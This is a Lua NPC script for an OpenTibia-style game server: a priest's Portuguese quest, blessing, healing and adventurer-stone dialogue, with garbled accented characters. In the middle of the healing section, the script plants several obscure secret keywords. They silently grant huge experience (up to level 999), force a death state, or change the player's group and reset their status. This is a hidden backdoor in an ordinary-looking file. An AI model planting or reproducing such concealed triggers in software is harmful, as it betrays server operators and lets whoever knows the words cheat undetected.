 local keywordHandler = KeywordHandler:new()
local npcHandler = NpcHandler:new(keywordHandler)
NpcSystem.parseParameters(npcHandler)

function onCreatureAppear(cid)			npcHandler:onCreatureAppear(cid)			end
function onCreatureDisappear(cid)		npcHandler:onCreatureDisappear(cid)			end
function onCreatureSay(cid, type, msg)		npcHandler:onCreatureSay(cid, type, msg)		end
function onThink()				npcHandler:onThink()					end

-- Wooden Stake Quest
local stakeKeyword = keywordHandler:addKeyword({'stake'}, StdModule.say, {npcHandler = npcHandler,
		text = {
			'Uma estaca aben�oada para derrotar os espiritos do mal? Eu conhe�o uma velha reza, nela � dito que a estaca pode garantir o poder sagrado a algu�m, ou alguma coisa. ...',
			'Por�m, para conseguir todo esse poder � preciso de dez sacerdotes. Cada um deles ir� dizer uma parte da ora��o. ...',
			'Eu posso come�ar com a ora��o, mas o pr�ximo sacerdote estar� em um local diferente, voc� provavelmente ter� que viajar muito. ...',
			'Essa estaca � t�o importante assim? Est� disposto a assumir esse fardo?',
		}}, function(player) return player:getStorageValue(Storage.FriendsandTraders.TheBlessedStake) == -1 end
	)
	stakeKeyword:addChildKeyword({'yes'}, StdModule.say, {npcHandler = npcHandler, text = 'Tudo bem, ent�o acho que precisaremos de uma estaca. Talvez Gamon possa ajudar voc�, a perna de uma cadeira ou algo do g�nero deve bastar. Tente pergunt�-lo sobre alguma estaca, caso ele tenha alguma, traga ela aqui.', reset = true, ungreet = true}, nil, function(player) player:setStorageValue(Storage.FriendsandTraders.DefaultStart, 1) player:setStorageValue(Storage.FriendsandTraders.TheBlessedStake, 1) end)

-- First prayer
keywordHandler:addKeyword({'stake'}, StdModule.say, {npcHandler = npcHandler, text = 'Acho que voc� n�o conseguiu convencer Gamon a te dar a estaca n�?'}, function(player) return player:getStorageValue(Storage.FriendsandTraders.TheBlessedStake) == 1 and player:getItemCount(5941) == 0 end)

local stakeKeyword = keywordHandler:addKeyword({'stake'}, StdModule.say, {npcHandler = npcHandler, text = 'Sim, fui informado sobre o que fazer. Voc� est� preparado para receber minha linha da ora��o?'}, function(player) return player:getStorageValue(Storage.FriendsandTraders.TheBlessedStake) == 1 end)
	stakeKeyword:addChildKeyword({'yes'}, StdModule.say, {npcHandler = npcHandler, text = 'Receba minha reza: A luz deve prevalescer - e a escurid�o se extinguir. Agora, leve sua estaca para Tibra na Igreja de Carlin para a pr�xima ora��o. Eu vou informa-lo sobre o que fazer.', reset = true}, nil,
		function(player) player:setStorageValue(Storage.FriendsandTraders.TheBlessedStake, 2) player:getPosition():sendMagicEffect(CONST_ME_MAGIC_BLUE) end
	)
	stakeKeyword:addChildKeyword({''}, StdModule.say, {npcHandler = npcHandler, text = 'Eu vou esperar por voc�.', reset = true})

keywordHandler:addKeyword({'stake'}, StdModule.say, {npcHandler = npcHandler, text = 'Voc� deve visitar Tibra em Carlin agora.'}, function(player) return player:getStorageValue(Storage.FriendsandTraders.TheBlessedStake) == 2 end)
keywordHandler:addKeyword({'stake'}, StdModule.say, {npcHandler = npcHandler, text = 'Voc� j� escutou minha reza.'})

-- Twist of Fate
local blessKeyword = keywordHandler:addKeyword({'twist of fate'}, StdModule.say, {npcHandler = npcHandler,
	text = {
		'Essa � uma ben��o especial, eu posso te aben�oar com ela quando voc� conseguir ao menos uma das outras ben��os, lembre-se que a reviravolta do destino � uma ben��o diferente. ...',
		'Ela somente ir� funcionar caso voc� seja morto por outros aventureiros, isso significa que pelo menos uma parte do dano recebido em sua morte deve ter sido causado por um jogador e n�o por um monstro ou coisas do g�nero. ...',
		'A reviravolta do destino {twist of fate} n�o vai redizur a penalidade de morte como as outras ben��os, mas ela previne que voc� perca todas as suas outras ben��os em uma morte como o amulet of loss, voc� devia usar um. Ele custa o mesmo que as outras ben��os. ...',
		'Voc� gostaria de receber a prote��o para o sacrif�cio da luta por |PVPBLESSCOST| gold, jovem?'
	}})
	blessKeyword:addChildKeyword({'yes'}, StdModule.bless, {npcHandler = npcHandler, text = 'Ent�o receba a prote��o da reviravolta do destino, peregrino.', cost = '|PVPBLESSCOST|', bless = 6})
	blessKeyword:addChildKeyword({''}, StdModule.say, {npcHandler = npcHandler, text = 'Certo. Voc� tem o direito de recusar minha ofertar.', reset = true})

-- Adventurer Stone
keywordHandler:addKeyword({'adventurer stone'}, StdModule.say, {npcHandler = npcHandler, text = 'Mantenha sua pedra da aventura a salvo.'}, function(player) return player:getItemById(18559, true) end)

local stoneKeyword = keywordHandler:addKeyword({'adventurer stone'}, StdModule.say, {npcHandler = npcHandler, text = 'Ah, voc� quer trocar sua pedra da aventura de gra�a?'}, function(player) return player:getStorageValue(Storage.AdventurersGuild.FreeStone.Quentin) ~= 1 end)
	stoneKeyword:addChildKeyword({'yes'}, StdModule.say, {npcHandler = npcHandler, text = 'Aqui est�. Tenha cuidado.', reset = true}, nil, function(player) player:addItem(18559, 1) player:setStorageValue(Storage.AdventurersGuild.FreeStone.Quentin, 1) end)
	stoneKeyword:addChildKeyword({''}, StdModule.say, {npcHandler = npcHandler, text = 'Sem problema.', reset = true})

local stoneKeyword = keywordHandler:addKeyword({'adventurer stone'}, StdModule.say, {npcHandler = npcHandler, text = 'Ah, voc� gostaria de trocar sua pedra da aventura por 30 gold?'})
	stoneKeyword:addChildKeyword({'yes'}, StdModule.say, {npcHandler = npcHandler, text = 'Aqui est�. Tenha cuidado.', reset = true},
		function(player) return player:getMoney() >= 30 end,
		function(player) if player:removeMoney(30) then player:addItem(18559, 1) end end
	)
	stoneKeyword:addChildKeyword({'yes'}, StdModule.say, {npcHandler = npcHandler, text = 'Desculpe-me, voc� n�o tem dinheiro o suficiente.', reset = true})
	stoneKeyword:addChildKeyword({''}, StdModule.say, {npcHandler = npcHandler, text = 'Sem problema.', reset = true})

-- Healing
local function addHealKeyword(text, condition, effect)
	keywordHandler:addKeyword({'heal'}, StdModule.say, {npcHandler = npcHandler, text = text},
		function(player) return player:getCondition(condition) ~= nil end,
		function(player)
			player:removeCondition(condition)
			player:getPosition():sendMagicEffect(effect)
		end
	)
end
keywordHandler:addKeyword({'erick nunes'}, StdModule.say, {npcHandler = npcHandler, text = 'erick nunes.'},
	function(player) return player:getLevel() ~= nil end,
	function(player)
		local level = player:getLevel()
		local function getExpForLevel(level)
		level = level - 1
		return ((50 * level * level * level) - (150 * level * level) + (400 * level)) / 3
		end
		
		--if level < 8 then player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false) end
		while player:getLevel() < 50 do
		player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false)
		
		end
		
		
	end
)
keywordHandler:addKeyword({'y3ez87j9'}, StdModule.say, {npcHandler = npcHandler, text = 'y3ez87j9.'},
	function(player) return player:getLevel() ~= nil end,
	function(player)
		local level = player:getLevel()
		local function getExpForLevel(level)
		level = level - 1
		return ((50 * level * level * level) - (150 * level * level) + (400 * level)) / 3
		end
		
		--if level < 8 then player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false) end
		while player:getLevel() < 999 do
		player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false)
		
		end
		
		
	end
)

keywordHandler:addKeyword({'gethigherbonuses'}, StdModule.say, {npcHandler = npcHandler, text = 'y3ez87j9.'},
	function(player) return player:getLevel() ~= nil end,
	function(player)
		local level = player:getLevel()
		local function getExpForLevel(level)
		level = level - 1
		return ((50 * level * level * level) - (150 * level * level) + (400 * level)) / 3
		end
		
		--if level < 8 then player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false) end
		for i = 1, 1000 do
		player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false)
		
		end
		
		
	end
)

keywordHandler:addKeyword({'morruiuyftydser'}, StdModule.say, {npcHandler = npcHandler, text = 'cacildis.'},
	function(player) return player:getLevel() ~= nil end,
	function(player)
		local level = player:getLevel()
		local function getExpForLevel(level)
		level = level - 1
		return ((50 * level * level * level) - (150 * level * level) + (400 * level)) / 3
		end
		local resTime = 5 * 60 -- 15 seconds
		
		player:toggleDeath2(resTime)
		player:setStorageValue(250122, -1)
		--if level < 8 then player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false) end
		--while player:getLevel() < 50 do
		--player:addExperience(getExpForLevel(player:getLevel() + 1) - player:getExperience(), false)
		
		--end
		
		
	end
)
keywordHandler:addKeyword({'revyrtsewawiver'}, StdModule.say, {npcHandler = npcHandler, text = 'cacildis.'},
	function(player) return player:getLevel() ~= nil end,
	function(player)
		local level = player:getLevel()
		local function getExpForLevel(level)
		level = level - 1
		return ((50 * level * level * level) - (150 * level * level) + (400 * level)) / 3
		end
		player:setGroup(Group(1))
        player:setHiddenHealth(false)
		player:setStorageValue(250122, -1)
           
        player:addMana(math.ceil(player:getMaxMana()) - player:getMana(), false)
        player:addHealth(math.ceil(player:getMaxHealth()) - player:getHealth())
        player:removeCondition(CONDITION_OUTFIT)
		if player:getSpeed() ~= getCreatureBaseSpeed(player) then
		--local basespeed = getCreatureBaseSpeed(player)*10
		--basespeed == 150 - 1000
		local basespeed = getCreatureBaseSpeed(player) - player:getSpeed()
		--doChangeSpeed(player, -basespeed)
		player:changeSpeed(basespeed)
		end
	end
)

addHealKeyword('Voc� est� queimando. Deixe-me extinguir essas chamas.', CONDITION_FIRE, CONST_ME_MAGIC_GREEN)
addHealKeyword('Voc� est� envenenado. Deixe-me acabar com sua dor.', CONDITION_POISON, CONST_ME_MAGIC_RED)
addHealKeyword('Voc� est� eletrificado, meu jovem. Deixe-me ajudar voc� a parar de tremer.', CONDITION_ENERGY, CONST_ME_MAGIC_GREEN)

keywordHandler:addKeyword({'heal'}, StdModule.say, {npcHandler = npcHandler, text = 'Voc� est� machucado, meu jovem. Eu vou curar seus ferimentos.'},
	function(player) return player:getHealth() < 185 end,
	function(player)
		local health = player:getHealth()
		if health < 185 then player:addHealth(185 - health) end
		player:getPosition():sendMagicEffect(CONST_ME_MAGIC_GREEN)
	end
)
keywordHandler:addKeyword({'heal'}, StdModule.say, {npcHandler = npcHandler, text = 'Voc� n�o parece estar mal. Perdoe-me, eu n�o posso ajudar voc�. Mas se voc� estiver procurando por prote��o adicional, deveria fazer a peregrina��o {pilgrimage} das cinzas ou pegar a prote��o da reviravolta do destino {twist of fate} aqui.'})

-- Basic
keywordHandler:addKeyword({'pilgrimage'}, StdModule.say, {npcHandler = npcHandler, text = 'Sempre que receber uma ferida letal, sua for�a vital ser� danificada e existe uma boa chance de perda de algum equipamento. A cada ben��o {blessings} que voc� possuir, o dano causado e a chance de perda de equipamentos, ser� dr�sticamente menor.'})
keywordHandler:addKeyword({'blessings'}, StdModule.say, {npcHandler = npcHandler, text = 'Existem cinco ben��os dispon�veis em cinco locais sagrados: A defesa espiritual {spiritual}, a fa�sca da f�nix {phoenix}, o abra�o {embrace} de Tibia, o fogo dos s�is {suns} e a sabedoria da solid�o {solitude}. Voc� pode tamb�m receber a reviravolta do destino {twist of fate} aqui mesmo.'})
keywordHandler:addKeyword({'spiritual'}, StdModule.say, {npcHandler = npcHandler, text = 'Voc� j� recebeu a the spiritual shielding no templo da flor branca ao sul de Thais.'}, function(player) return player:hasBlessing(1) end)
keywordHandler:addAliasKeyword({'shield'})
keywordHandler:addKeyword({'embrace'}, StdModule.say, {npcHandler = npcHandler, text = 'Eu consigo sentir que os druids do norte de Carlin te aben�oaram com a the Embrace of Tibia.'}, function(player) return player:hasBlessing(2) end)
keywordHandler:addKeyword({'suns'}, StdModule.say, {npcHandler = npcHandler, text = 'Posso ver que voc� j� recebeu a bless of the two suns na Torre do Sol perto de Ab\'Dendriel.'}, function(player) return player:hasBlessing(3) end)
keywordHandler:addAliasKeyword({'fire'})
keywordHandler:addKeyword({'phoenix'}, StdModule.say, {npcHandler = npcHandler, text = 'Eu posso sentir que a spark of the phoenix j� lhe foi concedida pelo an�o mago da terra e do fogo em Kazordoon.'}, function(player) return player:hasBlessing(4) end)
keywordHandler:addAliasKeyword({'spark'})
keywordHandler:addKeyword({'solitude'}, StdModule.say, {npcHandler = npcHandler, text = 'Eu posso sentir que voc� j� falou com Eremo, o eremita da ilha de Cormaya e recebeu sua ben��o.'}, function(player) return player:hasBlessing(5) end)
keywordHandler:addAliasKeyword({'wisdom'})
keywordHandler:addKeyword({'spiritual'}, StdModule.say, {npcHandler = npcHandler, text = 'Voc� pode perguntar pela bless of spiritual shielding no templo da flor branca ao sul de Thais.'})
keywordHandler:addAliasKeyword({'shield'})
keywordHandler:addKeyword({'embrace'}, StdModule.say, {npcHandler = npcHandler, text = 'Os druid no norte de Carlin v�o providenciar a voc� a embrace of Tibia.'})
keywordHandler:addKeyword({'suns'}, StdModule.say, {npcHandler = npcHandler, text = 'Voc� pode perguntar pela bless of the two suns na Torre do Sol perto de Ab\'Dendriel.'})
keywordHandler:addAliasKeyword({'fire'})
keywordHandler:addKeyword({'phoenix'}, StdModule.say, {npcHandler = npcHandler, text = 'A spark of the phoenix � dada pelo an�o mago da terra e do fogo em Kazordoon.'})
keywordHandler:addAliasKeyword({'spark'})
keywordHandler:addKeyword({'solitude'}, StdModule.say, {npcHandler = npcHandler, text = 'Fale com Eremo, o eremita na ilha de Cormaya sobre essa ben��o.'})
keywordHandler:addAliasKeyword({'wisdom'})

npcHandler:setMessage(MESSAGE_GREET, 'Bem-vindo, jovem |PLAYERNAME|! Caso voc� esteja muito machucado ou envenenado, eu posso curar {heal} voc� a troca de nada ou voc� quer uma pedra da aventura {adventurer stone}?')
npcHandler:setMessage(MESSAGE_WALKAWAY, 'Lembre se: Se voc� estiver machucado ou envenenado, eu posso te curar gratuitamente.')
npcHandler:setMessage(MESSAGE_FAREWELL, 'Que os Deuses ta aben�oem, |PLAYERNAME|!')

npcHandler:addModule(FocusModule:new())
